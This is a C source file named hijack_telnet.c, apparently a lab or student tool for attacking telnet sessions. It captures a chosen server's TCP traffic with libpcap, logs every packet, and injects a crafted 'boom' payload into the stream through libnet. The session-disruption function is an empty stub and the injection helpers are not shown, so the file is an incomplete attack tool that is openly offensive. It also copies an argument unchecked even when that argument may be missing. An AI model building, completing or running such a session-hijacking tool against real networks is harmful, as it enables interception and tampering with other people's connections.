/**
 * hijack_telnet.c
 */

#include "sniffer.h"
#include "netlog.h"
#include "netlib.h"

#include <stdio.h>
#include <stdlib.h>

#include <signal.h>
#include <string.h>
#include <pcap.h>
#include <stdbool.h>

#define INFO_BUF_SIZE 256
#define INFO_BUFFER 128


pcap_t* handler;
libnet_t* netcons;


void leavesniffer(int sig) {
	struct pcap_stat stats;
    if (pcap_stats(handler, &stats) >= 0) {
		    
    }   
    pcap_close(handler);
    libnet_destroy(netcons);
    exit(0);
}



void disrupt_session(const u_char* data, struct ip_hdr* ipheader, struct tcp_hdr* tcpheader, struct ethernet_hdr* ethheader) {
	
	uint32_t ack_inc; // Amount to increment ACK
	uint32_t seq_inc; // Amount to increment SEQ
	


	return;
}


void parse_pkt(struct pcap_pkthdr* header, const u_char* data) {

	char payload[] = "boom";
	log_everything(header,data);
	attack_packet_header(netcons, data, payload); 


}



void main_loop(pcap_t* pd) {
    struct pcap_pkthdr *pktHeader;
    const u_char *pktData;
    int status;
    status = pcap_next_ex(pd, &pktHeader, &pktData);

    switch (status) {
        case 1:
            parse_pkt(pktHeader, pktData);
            main_loop(pd);
            break;
        case 0:
            main_loop(pd);
            break;
        case -1:
            printf("libpcap error in mainloop() - exiting...\n");
            leavesniffer(1);
            break;
        case -2:
            printf("Breakloop called - exiting...\n");
            leavesniffer(0);
            break;
        default:
            printf("Recieved unrecognized status in mainloop()...\n");
            leavesniffer(1);
            break;
    }
    return;
}




int main (int argc, char** argv) {
	if (argc < 3 || argc > 4) {
		printf("Usage: \n");
		printf("hijack_telnet server_name server_port [dev_name]\n");
		return 1;
	}
	char server[INFO_BUFFER];
	char device[INFO_BUFFER];
	strcpy(server, argv[1]);
	int port = atoi(argv[2]);
	strcpy(device, argv[3]);
	
	char filterbuf[INFO_BUFFER];
	/*
	sprintf(
		filterbuf,
		"tcp port %d and src host %s",
		port,
		server
	); */


	sprintf(
		filterbuf,
		"tcp port %d and host %s",
		port,
		server
	);

	
	if ((handler = open_pcap_socket_filtered(device, filterbuf))) {
		if ((netcons = open_libnet_handler(device))) {
			signal(SIGTERM, leavesniffer);
			signal(SIGINT, leavesniffer);
			signal(SIGQUIT, leavesniffer);
			main_loop(handler);
			leavesniffer(0);	
		} else {
			printf("Libnet could not be allocated...\n");
			return 1;
		}
	} else {
		printf("Handler could not be allocated...\n");
		return 1;
	}

	return 0;
}

